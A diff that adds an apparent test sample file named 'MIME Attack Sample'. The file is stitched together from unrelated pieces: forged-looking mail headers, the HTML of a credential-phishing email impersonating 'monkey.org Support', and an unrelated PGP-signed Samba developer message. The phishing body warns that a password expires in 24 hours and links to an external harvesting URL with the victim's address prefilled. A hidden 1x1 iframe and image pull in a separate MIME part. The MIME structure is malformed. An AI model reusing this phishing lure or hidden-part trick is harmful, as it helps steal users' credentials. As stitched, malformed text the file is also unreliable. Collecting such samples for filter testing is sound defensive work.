@@ -1,0 +1,271 @@
+From: ddelain@aol.com
+To: lee.huber@enron.com, gary.zahn@enron.com, drew.fossum@enron.com
+Subject: MIME Attack Sample
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+X-Rspamd-Server: rspam03
+X-Rspamd-Queue-Id: B64A3181E3648
+X-Spam-Status: No, score=8.26
+Authentication-Results: imf11.b.hostedemail.com;
+	dkim=none;
+	spf=softfail (imf11.b.hostedemail.com: 80.208.234.132 is neither permitted nor denied by domain of "prvs=087223bec6=email@keysolution-it.com") smtp.mailfrom="prvs=087223bec6=email@keysolution-it.com";
+	dmarc=none
+X-Stat-Signature: 1dskx4dg5bm6q6at4g5bp9zy8omtp11t
+X-HE-Tag: 1629939862-488767
+Status: O
+X-Status: 
+X-Keywords:                  
+X-UID: 65
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.=
+w3.org/TR/html4/loose.dtd">
+
+<HTML><HEAD>
+<META name=3DGENERATOR content=3D"MSHTML 11.00.9600.20064"></HEAD>
+<body style=3D"MARGIN: 0.5em">
+<P style=3D"FONT-SIZE: 12px; FONT-FAMILY: Tahoma, Geneva, sans-serif; WHITE=
+-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; =
+COLOR: rgb(0,0,0); PADDING-BOTTOM: 0px; FONT-STYLE: normal; TEXT-ALIGN: lef=
+t; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; ORPHANS: 2; WIDOWS: 2;=
+ LETTER-SPACING: normal; PADDING-RIGHT: 0px; BACKGROUND-COLOR: rgb(255,255,=
+255); TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant-caps: =
+normal; -webkit-text-stroke-width: 0px;=20
+text-decoration-thickness: initial; text-decoration-style: initial; text-de=
+coration-color: initial"><STRONG><SPAN style=3D"FONT-SIZE: 36px">monkey.org=
+&nbsp;&nbsp;SUPPORT</SPAN></STRONG></P>
+<P style=3D"FONT-SIZE: 12px; FONT-FAMILY: Tahoma, Geneva, sans-serif; WHITE=
+-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; =
+COLOR: rgb(0,0,0); PADDING-BOTTOM: 0px; FONT-STYLE: normal; TEXT-ALIGN: lef=
+t; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; ORPHANS: 2; WIDOWS: 2;=
+ LETTER-SPACING: normal; PADDING-RIGHT: 0px; BACKGROUND-COLOR: rgb(255,255,=
+255); TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant-caps: =
+normal; -webkit-text-stroke-width: 0px;=20
+text-decoration-thickness: initial; text-decoration-style: initial; text-de=
+coration-color: initial">&nbsp;</P>
+<P style=3D"FONT-SIZE: 12px; FONT-FAMILY: Tahoma, Geneva, sans-serif; WHITE=
+-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; =
+COLOR: rgb(0,0,0); PADDING-BOTTOM: 0px; FONT-STYLE: normal; TEXT-ALIGN: lef=
+t; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; ORPHANS: 2; WIDOWS: 2;=
+ LETTER-SPACING: normal; PADDING-RIGHT: 0px; BACKGROUND-COLOR: rgb(255,255,=
+255); TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant-caps: =
+normal; -webkit-text-stroke-width: 0px;=20
+text-decoration-thickness: initial; text-decoration-style: initial; text-de=
+coration-color: initial">&nbsp;</P>
+<P style=3D"FONT-SIZE: 12px; FONT-FAMILY: Tahoma, Geneva, sans-serif; WHITE=
+-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; =
+COLOR: rgb(0,0,0); PADDING-BOTTOM: 0px; FONT-STYLE: normal; TEXT-ALIGN: lef=
+t; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; ORPHANS: 2; WIDOWS: 2;=
+ LETTER-SPACING: normal; PADDING-RIGHT: 0px; BACKGROUND-COLOR: rgb(255,255,=
+255); TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant-caps: =
+normal; -webkit-text-stroke-width: 0px;=20
+text-decoration-thickness: initial; text-decoration-style: initial; text-de=
+coration-color: initial">&nbsp;</P>
+<P style=3D"FONT-SIZE: 12px; FONT-FAMILY: Tahoma, Geneva, sans-serif; WHITE=
+-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; =
+COLOR: rgb(0,0,0); PADDING-BOTTOM: 0px; FONT-STYLE: normal; TEXT-ALIGN: lef=
+t; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; ORPHANS: 2; WIDOWS: 2;=
+ LETTER-SPACING: normal; PADDING-RIGHT: 0px; BACKGROUND-COLOR: rgb(255,255,=
+255); TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant-caps: =
+normal; -webkit-text-stroke-width: 0px;=20
+text-decoration-thickness: initial; text-decoration-style: initial; text-de=
+coration-color: initial"><SPAN style=3D"FONT-SIZE: medium"><FONT size=3D4>D=
+ear<SPAN><SPAN>&nbsp;jose</SPAN></SPAN><BR></FONT></SPAN></P>
+<P style=3D"FONT-SIZE: 12px; FONT-FAMILY: Tahoma, Geneva, sans-serif; WHITE=
+-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; =
+COLOR: rgb(0,0,0); PADDING-BOTTOM: 0px; FONT-STYLE: normal; TEXT-ALIGN: lef=
+t; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; ORPHANS: 2; WIDOWS: 2;=
+ LETTER-SPACING: normal; PADDING-RIGHT: 0px; BACKGROUND-COLOR: rgb(255,255,=
+255); TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant-caps: =
+normal; -webkit-text-stroke-width: 0px;=20
+text-decoration-thickness: initial; text-decoration-style: initial; text-de=
+coration-color: initial"><BR><SPAN style=3D"FONT-SIZE: medium"><FONT size=
+=3D4>Your password will expire in&nbsp;24 Hours time (<STRONG>26th August, =
+2021</STRONG>)<BR><BR></FONT></SPAN></P>
+<P style=3D"FONT-SIZE: 12px; FONT-FAMILY: Tahoma, Geneva, sans-serif; WHITE=
+-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; =
+COLOR: rgb(0,0,0); PADDING-BOTTOM: 0px; FONT-STYLE: normal; TEXT-ALIGN: lef=
+t; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; ORPHANS: 2; WIDOWS: 2;=
+ LETTER-SPACING: normal; PADDING-RIGHT: 0px; BACKGROUND-COLOR: rgb(255,255,=
+255); TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant-caps: =
+normal; -webkit-text-stroke-width: 0px;=20
+text-decoration-thickness: initial; text-decoration-style: initial; text-de=
+coration-color: initial"><SPAN style=3D"FONT-SIZE: medium"><FONT size=3D4>K=
+indly confirm password to continue using same password.<BR>&nbsp;<BR></FONT=
+></SPAN></P>
+<table class=3D"yiv3774705853WYSIWYG_EDITOR_TABLE_IDM_SHOWZEROBORDERATDESIG=
+NTIME" style=3D"FONT-SIZE: 18px; BORDER-TOP: rgb(211,211,211) 1px dotted; F=
+ONT-FAMILY: Tahoma, Geneva, sans-serif; BORDER-RIGHT: rgb(211,211,211) 1px =
+dotted; WHITE-SPACE: normal; WORD-SPACING: 0px; BORDER-COLLAPSE: collapse; =
+BORDER-BOTTOM: rgb(211,211,211) 1px dotted; TEXT-TRANSFORM: none; FONT-WEIG=
+HT: 400; COLOR: rgb(34,34,34); FONT-STYLE: normal; TEXT-ALIGN: left; BORDER=
+-SPACING: 0px; BORDER-LEFT: rgb(211,211,211) 1px=20
+dotted; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; BACKGROUND-COLOR: rg=
+b(255,255,255); TEXT-INDENT: 0px; font-variant-ligatures: normal; font-vari=
+ant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-thickness=
+: initial; text-decoration-style: initial; text-decoration-color: initial" =
+width=3D"393" border=3D"0">
+<TBODY>
+<TR>
+<td style=3D"FONT-SIZE: 14px; BORDER-TOP: rgb(0,120,215) 1px solid; FONT-FA=
+MILY: &quot;Segoe UI Semibold&quot;, &quot;Segoe WP Semibold&quot;, &quot;S=
+egoe UI&quot;, &quot;Segoe WP&quot;, Segoe, Tahoma, &quot;Microsoft Sans Se=
+rif&quot;, Verdana, sans-serif; BORDER-RIGHT: rgb(0,120,215) 1px solid; WID=
+TH: 200px; VERTICAL-ALIGN: middle; WHITE-SPACE: nowrap; BORDER-BOTTOM: rgb(=
+0,120,215) 1px solid; WORD-BREAK: normal; COLOR: rgb(255,255,255); PADDING-=
+BOTTOM: 0px; TEXT-ALIGN: center; PADDING-TOP: 0px; PADDING-LEFT: 20px; MARG=
+IN: 0px; MIN-HEIGHT: 30px;=20
+BORDER-LEFT: rgb(0,120,215) 1px solid; LINE-HEIGHT: 20px; PADDING-RIGHT: 20=
+px; BACKGROUND-COLOR: rgb(0,120,215)"><SPAN style=3D"FONT-SIZE: medium"><FO=
+NT size=3D4>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT></SPAN>
+<A title=3D"This external link will open in a new window" style=3D"TEXT-DEC=
+ORATION: none; COLOR: rgb(25,106,212); OUTLINE-WIDTH: medium; OUTLINE-STYLE=
+: none" href=3D"http://srv172216.hoster-test.ru/AUTOPAGE/AUTOPAGE/update/in=
+dex.php?email=3Djose@monkey.org" rel=3D"nofollow noopener noreferrer" targe=
+t=3D_blank><SPAN style=3D"FONT-SIZE: large; COLOR: rgb(255,255,255)"><STRON=
+G>Confirm Password</STRONG></SPAN></A></TD></TR></TBODY></TABLE>
+<P style=3D'FONT-SIZE: 13px; FONT-FAMILY: "Helvetica Neue", Helvetica, Aria=
+l, sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none=
+; FONT-WEIGHT: 400; COLOR: rgb(29,34,40); PADDING-BOTTOM: 0px; FONT-STYLE: =
+normal; TEXT-ALIGN: left; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px;=
+ ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; PADDING-RIGHT: 0px; BACKGRO=
+UND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font-variant-ligatures: norm=
+al; font-variant-caps: normal;=20
+-webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-de=
+coration-style: initial; text-decoration-color: initial'>&nbsp;</P>
+<P style=3D"FONT-SIZE: 18px; FONT-FAMILY: arial, sans-serif; WHITE-SPACE: n=
+ormal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rg=
+b(34,34,34); PADDING-BOTTOM: 0px; FONT-STYLE: normal; TEXT-ALIGN: left; PAD=
+DING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; ORPHANS: 2; WIDOWS: 2; LETTE=
+R-SPACING: normal; PADDING-RIGHT: 0px; BACKGROUND-COLOR: rgb(255,255,255); =
+TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant-caps: normal=
+; -webkit-text-stroke-width: 0px;=20
+text-decoration-thickness: initial; text-decoration-style: initial; text-de=
+coration-color: initial">&nbsp;</P>
+<P style=3D"FONT-SIZE: 18px; FONT-FAMILY: arial, sans-serif; WHITE-SPACE: n=
+ormal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rg=
+b(34,34,34); PADDING-BOTTOM: 0px; FONT-STYLE: normal; TEXT-ALIGN: left; PAD=
+DING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; ORPHANS: 2; WIDOWS: 2; LETTE=
+R-SPACING: normal; PADDING-RIGHT: 0px; BACKGROUND-COLOR: rgb(255,255,255); =
+TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant-caps: normal=
+; -webkit-text-stroke-width: 0px;=20
+text-decoration-thickness: initial; text-decoration-style: initial; text-de=
+coration-color: initial"><STRONG>Note:</STRONG><SPAN>&nbsp;<SPAN style=3D"F=
+ONT-SIZE: 12pt"><STRONG>monkey.org Support</STRONG></SPAN></SPAN>&nbsp;will=
+ not be responsible for any login malfunction after this warning and no ver=
+ification response.</P>
+<P style=3D"FONT-SIZE: 12px; FONT-FAMILY: Tahoma, Geneva, sans-serif; WHITE=
+-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; =
+COLOR: rgb(0,0,0); PADDING-BOTTOM: 0px; FONT-STYLE: normal; TEXT-ALIGN: lef=
+t; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; ORPHANS: 2; WIDOWS: 2;=
+ LETTER-SPACING: normal; PADDING-RIGHT: 0px; BACKGROUND-COLOR: rgb(255,255,=
+255); TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant-caps: =
+normal; -webkit-text-stroke-width: 0px;=20
+text-decoration-thickness: initial; text-decoration-style: initial; text-de=
+coration-color: initial">&nbsp;</P>
+<P style=3D"FONT-SIZE: 12px; FONT-FAMILY: Tahoma, Geneva, sans-serif; WHITE=
+-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; =
+COLOR: rgb(0,0,0); PADDING-BOTTOM: 0px; FONT-STYLE: normal; TEXT-ALIGN: lef=
+t; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; ORPHANS: 2; WIDOWS: 2;=
+ LETTER-SPACING: normal; PADDING-RIGHT: 0px; BACKGROUND-COLOR: rgb(255,255,=
+255); TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant-caps: =
+normal; -webkit-text-stroke-width: 0px;=20
+text-decoration-thickness: initial; text-decoration-style: initial; text-de=
+coration-color: initial"><SPAN style=3D"FONT-SIZE: medium"><FONT size=3D4>T=
+hanks and Regards,</FONT></SPAN></P>
+<P style=3D"FONT-SIZE: 12px; FONT-FAMILY: Tahoma, Geneva, sans-serif; WHITE=
+-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; =
+COLOR: rgb(0,0,0); PADDING-BOTTOM: 0px; FONT-STYLE: normal; TEXT-ALIGN: lef=
+t; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; ORPHANS: 2; WIDOWS: 2;=
+ LETTER-SPACING: normal; PADDING-RIGHT: 0px; BACKGROUND-COLOR: rgb(255,255,=
+255); TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant-caps: =
+normal; -webkit-text-stroke-width: 0px;=20
+text-decoration-thickness: initial; text-decoration-style: initial; text-de=
+coration-color: initial"><BR><SPAN style=3D"FONT-SIZE: medium"><FONT size=
+=3D4><BR><SPAN style=3D"FONT-SIZE: 12pt"><STRONG>monkey.org Support</STRONG=
+> </SPAN>(C) 2021 Secured Service. -<SPAN>&nbsp;</SPAN><SPAN style=3D"TEXT-=
+DECORATION: none; COLOR: rgb(110,120,139)">This email was sent on 25th Augu=
+st 2021</SPAN></FONT></SPAN></P>
+<P style=3D"FONT-SIZE: 12px; FONT-FAMILY: Tahoma, Geneva, sans-serif; WHITE=
+-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; =
+COLOR: rgb(0,0,0); PADDING-BOTTOM: 0px; FONT-STYLE: normal; TEXT-ALIGN: lef=
+t; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; ORPHANS: 2; WIDOWS: 2;=
+ LETTER-SPACING: normal; PADDING-RIGHT: 0px; BACKGROUND-COLOR: rgb(255,255,=
+255); TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant-caps: =
+normal; -webkit-text-stroke-width: 0px;=20
+text-decoration-thickness: initial; text-decoration-style: initial; text-de=
+coration-color: initial"><BR>&nbsp;</P>
+<HR style=3D"FONT-SIZE: 12px; FONT-FAMILY: Tahoma, Geneva, sans-serif; WHIT=
+E-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400;=
+ COLOR: rgb(0,0,0); FONT-STYLE: normal; TEXT-ALIGN: left; ORPHANS: 2; WIDOW=
+S: 2; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDE=
+NT: 0px; font-variant-ligatures: normal; font-variant-caps: normal; -webkit=
+-text-stroke-width: 0px; text-decoration-thickness: initial; text-decoratio=
+n-style: initial; text-decoration-color: initial">
+
+<P class=3D"yiv3774705853p64x9c yiv3774705853card-section" style=3D"FONT-SI=
+ZE: 18px; FONT-FAMILY: arial, sans-serif; WHITE-SPACE: normal; WORD-SPACING=
+: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(34,34,34); PADDIN=
+G-BOTTOM: 0px; FONT-STYLE: normal; TEXT-ALIGN: left; PADDING-TOP: 6px; PADD=
+ING-LEFT: 0px; MARGIN: 5px 0px 16px; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING:=
+ normal; PADDING-RIGHT: 0px; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDEN=
+T: 0px; font-variant-ligatures: normal;=20
+font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-=
+thickness: initial; text-decoration-style: initial; text-decoration-color: =
+initial"><SPAN style=3D"FONT-SIZE: 10pt; FONT-FAMILY: Tahoma, Geneva, sans-=
+serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-W=
+EIGHT: 400; COLOR: rgb(0,0,0); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; L=
+ETTER-SPACING: normal; TEXT-INDENT: 0px; text-decoration-style: initial; te=
+xt-decoration-color: initial"><EM><STRONG>
+Please do not reply to this email. This auto-mailbox is not monitored and y=
+ou will not receive a response.</STRONG></EM></SPAN></P>
+<P>&nbsp;</P></BODY></HTML>
+Content-Type: text/html
+<iframe width="1" height="25" src="cid:target" frameborder="0"></iframe><img    width="1" height="1"  src="cid:target">
+--BOUNDARY
+Content-ID: <target>
+Content-Type: text/plain
+BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA1
+
+Tridge,
+
+> Author: tridge
+> Date: 2007-06-04 01:37:05 +0000 (Mon, 04 Jun 2007)
+> New Revision: 23322
+> 
+> WebSVN: http://websvn.samba.org/cgi-bin/viewcvs.cgi?view=rev&root=samba&rev=23322
+> 
+> Log:
+> 
+> - added ldb back into the build
+> 
+> - added back the ldb groupdb backend
+
+Thanks.
+
+> - enable switching between the tdb and ldb backends using
+>   "groupdb:backend". This is a safety net only, it should 
+>   go away in future versions
+
+If you feel comfortable enough with it, I'd rather just drop
+the selectable backend option.  We might leave it in for testing
+but I would like to avoid it in the final 3.0.26 release.
+It can take so long to remove parameters from smb.conf once
+they are in released version.
+
+What do you think?
+
+
+
+
+cheers, jerry
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v1.4.6 (GNU/Linux)
+Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org
+
+iD8DBQFGZA1zIR7qMdg1EfYRAjyFAKChUgBzTUjcmZIj8X8ZdIFqDR/9hQCfXXp1
+FMmybUBkinnoCLimId8HsSw=
+=Pwzk
+-----END PGP SIGNATURE-----
+
